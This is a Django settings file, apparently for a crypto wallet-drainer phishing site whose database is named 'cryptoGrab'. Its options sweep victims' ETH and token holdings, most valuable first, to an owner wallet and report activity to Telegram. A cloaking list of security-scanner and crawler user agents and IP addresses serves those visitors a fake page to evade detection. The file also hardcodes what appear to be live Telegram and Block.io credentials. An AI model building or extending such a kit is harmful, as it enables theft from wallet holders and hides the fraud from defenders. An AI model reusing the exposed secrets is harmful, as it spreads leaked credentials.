from pathlib import Path

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent

DEBUG = True

# чтобы поставить фэйкт поменяйте на fakes
ROOT_URLCONF = 'main.urls'

OWNER_PBLC_CONFIG = {
    "owner_wallet" : "0x",
}

SEEDCONFIG = {
    'telegramBotToken': 'telegramBotToken',
    'screen_chat_id': 'screen_chat_id',
    'actions_chat_id': 'actions_chat_id',
    'owner_wallet': 'owner_wallet'
}

FAKES_IP = "159.223.174.144"

UALIST = ["censysInspect","python","Go-http-client","libwww-perl","zgrab","InternetMeasurement","curl","tomcat","Googlebot","Dataprovider.com","scaninfo@paloaltonetworks.com","AhrefsBot","serpstatbot","Facebot","CheckMarkNetwork","bingbot","bit.ly","scrappy","TelegramBot","nmap"]
IPLIST = ["159.223.174.144","167.94.138.117","167.248.133.61","134.122.35.83", ]

BLOCK_IO = {
    'apikey': 'fc10-25e0-bbdb-70e9',
    'secret pin': 'BAK8312164500855',
    'bitcoin address': '378RpMW7xhKtHtC3scxm7KBZm5dT56ZYXb'
}

TELEGRAM_CONFIG = {
    "enable_telegram_notification" : True,
    "telegram_token" : "5689486197:AAE6fEx2FClHgYsZ5lcvDOFHlnMYH58C1Ow",
}

API_PBLC_CONFIG = {
    "infura_api_key" : "123",
    "infury_api_link" : "https://mainnet.infura.io/v3/123"
}

OPTIONS_CONFIG = {
    "enable_erc20_stake" : True,
    "enable_erc721_stake" : True,
    "enable_erc1155_stake" : True,
    "enable_eth_stake" : True,
    "enable_stake_most_expensive_erc20_token_first" : True, # only on mainnet
    "enable_only_stake_most_expensive_erc20_token" : True, # only on mainnet
    "minima_eth_balance_to_send" : 0.0001
}

CHAIN_CONFIG = {
    "chain_id" : "1"
}

WEBPAGE_CONFIG = {
    "login_button" : "login_button",
    "mint_button" : "mint_button",
    "not_logged_div" : "not_logged",
    "logged_div" : "logged",
    "user_wallet_span" : "user_wallet_span",
    "user_wallet_span_mobile" : "user_wallet_span_mobile"
}

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'django-insecure-**wx$ret758*h5g^c=znkcnkvi0$__8=ma7tjm%ec7($)o0!#^'

# SECURITY WARNING: don't run with debug turned on in production!

ALLOWED_HOSTS = ['*']

AUTH_USER_MODEL = 'main.User'
LOGIN_URL = '/login'
LOGIN_REDIRECT_URL = '/profile'

# Application definition

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'main',
    'fakes'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]


TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'web.wsgi.application'


# Database
# https://docs.djangoproject.com/en/4.0/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql', 
        'NAME': 'cryptoGrab',
        'USER': 'root',
        'PASSWORD': '',
        'HOST': 'localhost',
        'PORT': '3306',
    }
}


# Password validation
# https://docs.djangoproject.com/en/4.0/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/4.0/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/4.0/howto/static-files/

STATIC_URL = 'static/'
STATIC_ROOT = 'static/'
MEDIA_ROOT = 'main/'
APPEND_SLASH=False
# Default primary key field type
# https://docs.djangoproject.com/en/4.0/ref/settings/#default-auto-field

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
